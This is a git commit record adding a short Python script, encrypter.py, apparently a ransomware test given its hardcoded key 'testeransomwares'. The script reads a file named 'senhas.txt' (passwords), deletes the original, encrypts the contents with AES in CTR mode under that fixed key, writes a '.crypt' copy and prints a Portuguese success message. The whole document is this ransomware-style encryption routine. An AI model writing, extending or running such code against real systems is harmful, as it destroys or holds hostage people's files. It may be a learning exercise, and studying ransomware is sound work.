4c6e45b0efe191a1fde480a67ded14ee1d82f5fb
HCBequipe <viniciuscosta150@hotmail.com>
2026-09-12 19:07:00 -0300

    Add files via upload

---
+++ encrypter.py
@@ -0,0 +1,21 @@
+import os
+import pyaes
+
+file_name = "senhas.txt"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+os.remove(file_name)
+
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+crypto_data = aes.encrypt(file_data)
+
+new_file = file_name + ".crypt"
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
+
+print("este arquivo foi criptografado com sucesso!")
